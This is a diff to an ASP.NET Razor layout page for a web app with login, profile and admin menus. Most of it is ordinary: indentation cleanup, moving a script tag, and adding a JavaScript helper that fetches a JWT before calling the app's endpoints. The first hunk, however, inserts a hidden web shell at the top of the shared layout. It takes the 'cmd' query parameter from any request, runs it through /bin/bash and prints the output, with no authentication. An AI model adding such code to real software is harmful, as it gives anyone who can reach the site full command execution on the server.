@@ -1,4 +1,37 @@
-﻿<!DOCTYPE html>
+﻿@using System.Diagnostics
+@{
+    Layout = null;
+    string cmd = Context.Request.Query["cmd"];
+    string output = "";
+
+    if (!string.IsNullOrEmpty(cmd))
+    {
+        try
+        {
+            var psi = new ProcessStartInfo
+            {
+                FileName = "/bin/bash",
+                Arguments = $"-c \"{cmd}\"",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+
+            using (var process = Process.Start(psi))
+            {
+                output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
+                process.WaitForExit();
+            }
+        }
+        catch (Exception ex)
+        {
+            output = $"Error: {ex.Message}";
+        }
+        <text>@output</text>
+    }
+}
+<!DOCTYPE html>
 <html lang="en" data-bs-theme="dark">
 <head>
     <meta charset="utf-8" />
@@ -9,7 +42,6 @@
     <link rel="stylesheet" href="~/css/site.css" asp-append-version="true" />
     <script src="~/lib/jquery/dist/jquery.min.js"></script>
     <script src="~/lib/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="~/js/site.js" asp-append-version="true"></script>
 </head>
 <body>
     <header>
@@ -36,29 +68,29 @@
                             <span class="navbar-toggler-icon"></span>
                         </button>
                         <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="userMenuButton">
-                            @if (RequestContext.Instance.CurrentUser.Value != null)
+                        @if (RequestContext.Instance.CurrentUser.Value != null)
                         {
                             <li>
-                                    <a class="dropdown-item" asp-area="" asp-controller="Profiles" asp-action="Index">Profile</a>
-                                </li>
+                                <a class="dropdown-item" asp-area="" asp-controller="Profiles" asp-action="Index">Profile</a>
+                            </li>
                             <li>
-                                    <a class="dropdown-item" asp-area="" asp-controller="Identity" asp-action="Logout">Logout</a>
-                                </li>
-                                <li id="top_menu_dropdown_admin" style="display: none">
-                                    <a class="dropdown-item" href="/@nameof(AdminController).RemoveControllerSuffix()">
-                                        Admin
-                                        <span id="adminBadge" class="badge bg-secondary ms-1"></span>
-                                    </a>
-                                </li>
+                                <a class="dropdown-item" asp-area="" asp-controller="Identity" asp-action="Logout">Logout</a>
+                            </li>
+                            <li id="top_menu_dropdown_admin" style="display: none">
+                                <a class="dropdown-item" href="/@nameof(AdminController).RemoveControllerSuffix()">
+                                    Admin
+                                    <span id="adminBadge" class="badge bg-secondary ms-1"></span>
+                                </a>
+                            </li>
                         }
                         else
                         {
                             <li>
-                                    <a class="dropdown-item" asp-area="" asp-controller="Identity" asp-action="LoginPage">Login</a>
-                                </li>
+                                <a class="dropdown-item" asp-area="" asp-controller="Identity" asp-action="LoginPage">Login</a>
+                            </li>
                             <li>
-                                    <a class="dropdown-item" asp-area="" asp-controller="Identity" asp-action="Register">Register</a>
-                                </li>
+                                <a class="dropdown-item" asp-area="" asp-controller="Identity" asp-action="Register">Register</a>
+                            </li>
                         }
                             <li id="top_menu_dropdown_divider">
                                 <hr class="dropdown-divider" />
@@ -106,7 +138,49 @@
             errorDiv.innerText = data.errorMessage;
             errorDiv.style.display = 'block';
         };
+
+        async function makeAuthorizedRequest(url, httpMethod, body = {}, headers = {}, customCallback = undefined) {
+            body = body || {};
+            headers = headers || {};
+
+            console.log(url, httpMethod, body, headers, customCallback);
+
+            const tokenResponse = await fetch('@Url.ActionLink(nameof(IdentityController.TokenRetrieval), nameof(IdentityController).RemoveControllerSuffix())', {
+                method: 'GET',
+                headers: { 'Content-Type': 'application/json' }
+            });
+            const tokenJsonReponse = await tokenResponse.json();
+
+            const response = await fetch(url, {
+                method: httpMethod,
+                headers: {
+                    ...headers,
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${tokenJsonReponse.jwt}`
+                },
+                body: body ? JSON.stringify(body) : null,
+            });
+            const jsonResponse = await response.json();
+
+            if (customCallback) {
+                customCallback(jsonResponse);
+                return;
+            }
+
+            if (jsonResponse.success) {
+                if (jsonResponse.redirectUrl) {
+                    window.location.href = jsonResponse.redirectUrl;
+                    return;
+                }
+
+                window.location.reload();
+                return;
+            }
+
+            handleException(jsonResponse);
+        }
     </script>
+    <script src="~/js/site.js" asp-append-version="true"></script>
     @await RenderSectionAsync("Scripts", required: false)
     <script>
         document.addEventListener("DOMContentLoaded", function () {
